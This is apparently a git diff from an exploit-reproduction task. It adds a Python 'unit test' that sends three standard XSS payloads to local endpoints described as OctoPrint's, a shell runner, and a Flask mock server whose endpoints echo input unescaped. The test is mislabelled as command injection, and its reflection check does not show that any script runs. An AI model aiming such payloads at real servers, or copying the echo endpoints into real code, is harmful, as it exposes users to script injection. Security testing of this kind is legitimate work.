
diff --git a/ACI_unit_test.py b/ACI_unit_test.py
new file mode 100644
index 000000000..d69d6b9eb
--- /dev/null
+++ b/ACI_unit_test.py
@@ -0,0 +1,41 @@
+import requests
+
+# Define the URL where the vulnerable functions are exposed
+base_url = "http://localhost:5000"  # This should be the URL where OctoPrint is running
+
+# Define the payloads that exploit the XSS vulnerability
+payloads = [
+    "<script>alert('XSS');</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "javascript:alert('XSS')"
+]
+
+# Function to test the vulnerability in determineWebcamStreamType
+def test_determineWebcamStreamType():
+    url = f"{base_url}/api/webcam?type={payloads[0]}"
+    response = requests.get(url)
+    if payloads[0] in response.text:
+        return True
+    return False
+
+# Function to test the vulnerability in getExternalHostUrl
+def test_getExternalHostUrl():
+    url = f"{base_url}/api/externalHost?url={payloads[1]}"
+    response = requests.get(url)
+    if payloads[1] in response.text:
+        return True
+    return False
+
+# Function to test the vulnerability in validateWebcamUrl
+def test_validateWebcamUrl():
+    url = f"{base_url}/api/validateUrl?url={payloads[2]}"
+    response = requests.get(url)
+    if payloads[2] in response.text:
+        return True
+    return False
+
+# Run the tests
+if test_determineWebcamStreamType() and test_getExternalHostUrl() and test_validateWebcamUrl():
+    print("The ACI exploit success!!!")
+else:
+    print("The ACI exploit failed!!!")
diff --git a/ACI_unit_test.sh b/ACI_unit_test.sh
new file mode 100755
index 000000000..baef9f85f
--- /dev/null
+++ b/ACI_unit_test.sh
@@ -0,0 +1,21 @@
+#!/bin/bash
+
+# Ensure the script stops if an error occurs
+set -e
+
+# Setup the environment
+echo "Setting up the environment..."
+# Assuming the repository uses Python 3.7 or higher
+python3 -m venv venv
+source venv/bin/activate
+
+# Install dependencies (if any)
+pip install requests
+
+# Run the exploit test script
+echo "Running the exploit test script..."
+python ACI_unit_test.py
+
+# Deactivate the virtual environment
+deactivate
+echo "Test completed."
diff --git a/mock_server.py b/mock_server.py
new file mode 100644
index 000000000..6f160e279
--- /dev/null
+++ b/mock_server.py
@@ -0,0 +1,22 @@
+from flask import Flask, request, jsonify
+
+app = Flask(__name__)
+
+# Simulate the vulnerable endpoints
+@app.route('/api/webcam', methods=['GET'])
+def determineWebcamStreamType():
+    type_param = request.args.get('type', '')
+    return jsonify({"response": type_param})
+
+@app.route('/api/externalHost', methods=['GET'])
+def getExternalHostUrl():
+    url_param = request.args.get('url', '')
+    return jsonify({"response": url_param})
+
+@app.route('/api/validateUrl', methods=['GET'])
+def validateWebcamUrl():
+    url_param = request.args.get('url', '')
+    return jsonify({"response": url_param})
+
+if __name__ == '__main__':
+    app.run(debug=True, port=5000)
